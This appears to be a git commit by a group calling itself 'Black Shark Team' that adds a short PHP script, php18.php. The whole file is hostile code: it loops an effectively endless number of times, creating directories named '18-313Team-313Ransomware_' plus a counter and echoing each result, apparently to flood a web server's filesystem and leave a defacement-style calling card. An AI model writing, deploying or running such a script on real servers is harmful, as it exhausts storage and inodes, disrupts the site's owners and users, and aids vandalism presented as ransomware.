57d0728f6fce0fff70b1a33328757df6fd2dd94a
Black Shark Team <90838642+ZeroBlackShark@users.noreply.github.com>
2024-05-26 00:42:39 +0300

    Add files via upload

---
+++ php18.php
@@ -0,0 +1,18 @@
+<?php
+
+$numberOfFolders = 10000000000000000000000000000000000;
+
+
+for ($i = 1; $i <= $numberOfFolders; $i++) {
+    
+    $folderName = '18-313Team-313Ransomware_' . $i;
+    
+    
+    if (!file_exists($folderName)) {
+        mkdir($folderName);
+        echo "Folder '$folderName' created successfully.<br>";
+    } else {
+        echo "Folder '$folderName' already exists.<br>";
+    }
+}
+?>
